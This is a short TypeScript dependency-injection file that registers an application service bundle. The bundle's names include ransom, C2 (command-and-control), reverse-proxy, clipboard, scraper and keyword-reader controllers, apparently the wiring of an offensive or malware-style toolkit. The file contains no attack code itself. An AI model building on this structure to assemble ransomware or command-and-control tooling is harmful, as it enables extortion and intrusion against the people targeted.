import { Container, Token, TOKENS } from "../src/shared/Container.js";
import type { AppServices } from "./services/ServicesContext.js";
import { ArtService } from "./services/ArtService.js";

export const APP_SERVICES = new Token<AppServices>("AppServices");

export function addPublic(container: Container): void {
  container.register(APP_SERVICES, (c) => ({
    emailController:        c.resolve(TOKENS.EmailController),
    mongoController:        c.resolve(TOKENS.MongoController),
    supabaseController:     c.resolve(TOKENS.SupabaseController),
    proxyController:        c.resolve(TOKENS.ProxyController),
    proxyReverseController: c.resolve(TOKENS.ProxyReverseController),
    scraperController:      c.resolve(TOKENS.ScraperController),
    ransomController:       c.resolve(TOKENS.RansomController),
    c2Controller:           c.resolve(TOKENS.C2Controller),
    clipboardService:       c.resolve(TOKENS.IClipboard),
    keywordReader:          c.resolve(TOKENS.IKeywordReader),
    fileStorage:            c.resolve(TOKENS.IFileStorage),
    artService:             new ArtService(),
  }));
}

